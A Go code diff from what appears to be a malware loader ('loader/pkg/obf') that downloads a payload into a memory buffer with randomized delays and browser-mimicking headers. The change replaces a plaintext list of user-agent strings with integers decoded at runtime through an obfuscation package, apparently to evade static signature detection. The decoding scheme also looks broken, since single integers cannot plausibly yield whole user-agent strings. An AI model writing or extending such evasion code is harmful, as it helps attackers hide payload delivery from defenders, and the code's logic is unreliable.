@@ -11,6 +11,7 @@ import (
 	"math/rand"
 	"net/url"
 	"strings"
+	"loader/pkg/obf"
 )
 
 // Global buffer to prevent GC during execution
@@ -43,15 +44,6 @@ func FindBufferRegion(buffer []byte) (uintptr, uint32, error) {
 	return bufferAddr, bufferSize, nil
 }
 
-var userAgents = []string{
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
-}
 
 func DownloadFile(targetURL string) ([]byte, error) {
 	delay := time.Duration(rand.Intn(400)+100) * time.Millisecond
@@ -92,7 +84,9 @@ func DownloadFile(targetURL string) ([]byte, error) {
 	if err != nil {
 		return nil, fmt.Errorf("failed to create request: %v", err)
 	}
-	ua := userAgents[rand.Intn(len(userAgents))]
+	
+	// Use decoded user agent instead of plaintext array
+	ua := GetUA()
 	req.Header.Set("User-Agent", ua)
 	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
@@ -144,4 +138,29 @@ func DownloadFile(targetURL string) ([]byte, error) {
 	time.Sleep(delay)
 	
 	return result, nil
+}
+
+func randomIndex(length int) int {
+	return rand.Intn(length)
+}
+
+func GetUA() string {
+	values := []uint32{
+		1952754633, 2905136297, 4130953010, 4130951921, 2515949141,
+		222516017, 2693133715, 3709930420, 3153036755, 4203786264,
+		1434070913, 423778214, 350507105, 1703267631, 3830667078,
+		1914621356, 2417304603, 543457218, 4271095422, 3184214496,
+		2052393191, 4208372894, 3634488812, 3991748456, 1095669213,
+		1142401931, 1146977454, 1770329412, 1030629383, 1934717116,
+		1330649263, 1210002353, 1524148092, 681145231, 1609284707,
+		1760052334, 3862912451, 1794335975, 1918804120, 2964903769,
+		307468793, 2124166808, 1970919641, 1595158123, 422147776,
+		3866893171, 267248916, 892945811, 1548893238, 2054794018,
+		368480778, 205656825, 247455888, 710845588, 3852485815,
+		2649214766, 3705530546, 2728434626, 4277221896,
+	}
+
+	// Pick a random value from the array
+	randIdx := randomIndex(len(values))
+	return obf.Decode(values[randIdx])
 }
